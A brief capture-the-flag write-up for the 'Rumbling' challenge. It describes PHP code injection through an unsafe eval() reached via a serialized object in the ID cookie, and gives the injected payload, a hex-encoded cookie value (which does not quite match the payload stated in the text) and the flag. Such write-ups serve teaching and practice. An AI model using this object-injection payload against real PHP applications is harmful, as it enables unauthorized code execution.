# RUMBLING

## Write-up

by reading the source code : 
we find that when the Rumbling object is being serialized , it executes a php expression using eval() 
let's attempt php code injection !

we shall create a rumbling object with the following value as steps attribute : `1;global $flag ; echo $flag;1`
then we serialize it and encode it 

which gives us this value to use in the ID cookie : 4f3a383a2252756d626c696e67223a323a7b733a343a226e616d65223b733a343a2273616d69223b733a353a227374657073223b733a33323a22343b676c6f62616c2024666c61673b6563686f2024666c61673b6563686f2032223b7d

## Flag

`nexus{1_h4v3_Th3_fr33d0m_t0_c0nt1nu3_m0vinG_forward}`
